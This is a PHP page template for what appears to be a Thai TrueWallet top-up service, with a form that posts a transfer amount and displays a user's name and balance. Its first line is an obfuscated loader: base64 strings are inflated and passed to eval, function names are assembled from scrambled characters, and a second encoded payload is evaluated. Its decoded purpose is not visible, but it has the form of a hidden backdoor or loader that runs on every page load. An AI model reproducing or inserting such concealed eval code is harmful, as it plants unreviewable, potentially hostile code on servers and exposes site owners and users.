<?php  $keystroke1 = base64_decode("d2RyMTU5c3E0YXllejd4Y2duZl90djhubHVrNmpoYmlvMzJtcA=="); eval(gzinflate(base64_decode('hY7NCoJAFIVf5SQu5tIUzVpc9hxSeq0huwPzA4X47ikxEm7anu/82V7t+iRttE4aftkQgyq8iyyt67ggGjPFqqoyRG/lpsvL0yWJhBHlg9+oEdJ1ZqsBJw1DFWyvZmVgyYTq2iwxzzF5QXv3yvlOLS2EPXJxhQk8BP7vxHH5d/7+274wGpv5gyH9uzJNHw=='))); $O0O0O0O0O0O0=$keystroke1[2].$keystroke1[32].$keystroke1[20].$keystroke1[11].$keystroke1[23].$keystroke1[15].$keystroke1[32].$keystroke1[1].$keystroke1[11]; $keystroke2 = $O0O0O0O0O0O0("xes26:tr5bzf{8ydhog`uw9omvl7kicjp43nq", -1); $OO000OO000OO=$keystroke2[16].$keystroke2[12].$keystroke2[31].$keystroke2[23].$keystroke2[18].$keystroke2[24].$keystroke2[9].$keystroke2[20].$keystroke2[11]; $O0000000000O=$keystroke1[30].$keystroke1[9].$keystroke1[6].$keystroke1[11].$keystroke1[27].$keystroke1[8].$keystroke1[19].$keystroke1[1].$keystroke1[11].$keystroke1[15].$keystroke1[32].$keystroke1[1].$keystroke1[11]; eval($OO000OO000OO(base64_decode('LdA1zu
RmAADQy0Ta/eXCDJ+iLQzjMYyZ3USmMTP79EmR5h
3gFUfS/f7LMBAE+Z/fabIWFPFPXmRjXvz+9ck5aZ
m3gGUF6/FcCiZaLlIW2z9TJGnGt0YMYwcostq8oU
Qeg21Jcjrw48DO9KQFGIqxLkB6F77szqzCjkZBL9
tSurZZptATjrP0MDhQiOw5KixX1D2y/aZtO2JfaU
ywCb2M4ZUi1OwdnWl3IrOJg4My8ABr6LljyYBVt2
YaOb5kjSy4kt3UvKtP5ar5ewpz0IcTDa06zstlAV
G34HmJC1NquLFJbRM5tuZFbRLqkXLBLqXsBTpmjJ
b5kI37HHb2QRGmZmLcmYgnRRMDIVFeNyLH3MqlkS
o32WWRwWaQilsBKFWZ0eVxHv446w3qQ5tO/ov743
OpPP3dgT/2MIdFkH6sTaq5OurFz1KQkJ+8F03Vsm
0Ia1OaSvLNt71fTcqNQRZTF0fpqrOLDzN7cONtUF
0ngkJHk1wsCDXoIfCp81YY+X2SaXJuXolAt5fXor
vrBDqptIvuaBzbU+uIp1kaL95/6Y26GcOVM9NSiE
gyGk4H5344gA2bCsmMCCmMF1rB9zVhnGJud1CbAe
owig5MIF/8YEFb3T4atdZP8HyV+ZmwRPKnwx/TSX
aWj8oklPvJXXZHzBcVCQ4jk7A+AqnoPFNxP7Muop
6VVeTALfR33XD1zD1VnWvn9tMmYaL6LQWKIigeJe
s6l5Ccx0ZRU+1WCKaSSVHoCIO32BHWtcBVb+1+FH
LPbVcS2HNxhwBgOcHvagKUVJYYQr1/YqRsV5zHsz
wrdxUdGUcJoFQqvCk78ydrMTiUBCrF2+S6xzu/xU
+95TEIXwaA38blAxpnhyPZ6K/tsFaJqUYzmMYLvk
2eO3ybkctxbQqJ58BcwwQ5va54qFJhXcHkW84ZKd
u1pJwfzXLWuHMXbxrYuqbRNVT6RBiNFeZrnJM2e3
qfdB3KV48xI1aymAcullvUfIktn/anSEFPjJu87H
S9A32+fMNmnpEPkIekHjP7VTtUwPzyVlmT8lAbuM
w35vcjCMLNQWDAv/i1SzuV4aGWxXRYrBOStgfggt
ymLM+18l5xvP1WbHNkBzGVyoUjTIeU71fFJIaHVe
LK1up5CEf4MLCJwxBn/fnz6+fn5+9/AQ=='))); ?>

<!DOCTYPE html>
<html lang="en" class="login-css-style">
<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="description" content="">
    <meta name="author" content="">
    <link rel="shortcut icon" href="https://www.ocspanel.info/truewallets/favicon.ico.png" tppabs="https://www.ocspanel.info/truewallets/favicon.ico">
    <title></title>
    <link rel="stylesheet" href="https://www.ocspanel.info/truewallets/login.css" tppabs="https://www.ocspanel.info/truewallets/login.css">
    <link rel="stylesheet" href="https://www.ocspanel.info/truewallets/login.css" tppabs="https://www.ocspanel.info/truewallets/process.css">
	<link rel="stylesheet" href="https://www.ocspanel.info/truewallets/login.css" tppabs="https://www.ocspanel.info/truewallets/sweetalert.css">
	<meta name="stats-in-th" content="841e" />
	 <!-- Custom Fonts -->
    <link href="http://maxcdn.bootstrapcdn.com/font-awesome/latest/css/font-awesome.min.css" rel="stylesheet">
  	<link href="https://fonts.googleapis.com/icon?family=Material+Icons" rel="stylesheet">
  
	  <link href='https://fonts.googleapis.com/css?family=Kanit|Mitr|Pridi:400,300&subset=thai,latin' rel='stylesheet' type='text/css'>
    <style>
		body {
		  font-family: 'Kanit', sans-serif;
		  font-family: 'Pridi', serif;
		  font-family: 'Mitr', sans-serif;
		}
		h1 {
		  font-family: 'Kanit', sans-serif;
		  font-family: 'Pridi', serif;
		  font-family: 'Mitr', sans-serif;
		}
    </style>
</head>

<!--[if (gt IE 8)|!(IE)]><!--><body><!--<![endif]-->
<!--[if lt IE 9 ]>    <body class="ie8">    <![endif]-->
    <div id="main" class="layout-container">
      <div id="content">
		<div class="tmn-panel">
		  <div class="tmn-panel-body">
			
						<div class="content col-sm-7 col-md-7 col-xs-12 col-sm-push-5">
						  <div class="login-wrapper centered">
							<form action="confirm.php" method="post">
							  <img src="https://www.ocspanel.info/truewallets/logo-m.png" tppabs="https://www.ocspanel.info/truewallets/logo-m.png" />
							  <p align="center"><b>&#3594;&#3639;&#3656;&#3629;&#3610;&#3633;&#3597;&#3594;&#3637; :</b> <?php echo $result['username'];?> <b>&#3618;&#3629;&#3604;&#3648;&#3591;&#3636;&#3609;&#3588;&#3591;&#3648;&#3627;&#3621;&#3639;&#3629; :</b> <?php echo $result['saldo'];?></p>
							  <div class="input-group text-center">
		<span class="input-group-addon">
		<div align="left">
	<input style="text-align: center" name="wallet" type="number" class="form-control" value="ยอดที่ต้องการเติม" placeholder="ยอดที่ต้องการเติม" required>
	</div>    
	</div>    
							<div class="col-xs-12 single-col-xs">
								<input type="submit" class="btn btn-lg btn-primary btn-submit" name="wallet" onClick="this.disabled=1;this.value='รอสักครู่กำลังตรวจสอบยอดเงิน...';document.forms[0].submit();loading()" value="ตรวจสอบการโอนเงิน"/>
							</form> 
						  </div>
			</div>
		  </div>	
								
								<div class="bill-wrapper col-sm-5 col-md-5 col-xs-12 col-sm-pull-7">
			  <div class="bill intro-wallet">
				<div id="iframe-login">
				  <div class="iframe-container">
					<br>
					<img src="https://cdn.pixelprivacy.com/wp-content/uploads/2017/10/VPN-Icon.png" width="100%" height="100%" tppabs="https://cdn.pixelprivacy.com/wp-content/uploads/2017/10/VPN-Icon.png">
										<br>									
					<p>Top up credit by &#3648;&#3630;&#3637;&#3618;&#3648;&#3610;&#3636;&#3619;&#3660;&#3604;.com</p>
					<p>บริการตรวจสอบการโอนเงิน</p>
					<p><a onClick="return false">ระหว่างบัญชี True wallet</a></p>
				  </div>
				</div>
			  </div>
			</div>
	    </div>
	  </div>	
</div>
    </div>
    
    <div id="footer">
      <div class="row">
        <span class="col-xs-12 col-sm-10 col-md-9"><span>&copy;2018 e-wallet.&#3648;&#3630;&#3637;&#3618;&#3648;&#3610;&#3636;&#3619;&#3660;&#3604;.com All Rights Reserved.&nbsp;&nbsp; </span></span>
      </div>
    </div>
	
<div style="display:block;position:absolute;bottom:5px;right:5px;background:#fff;"><a href="http://e-wallet.เฮียเบิร์ด.com" tppabs="http://e-wallet.เฮียเบิร์ด.com" style="color:#000;font-weight:bold;padding:5px 7px;font-size:16px;" target="_blank">ติดต่อใช้งานคลิ๊ก</a>
</body>
</html>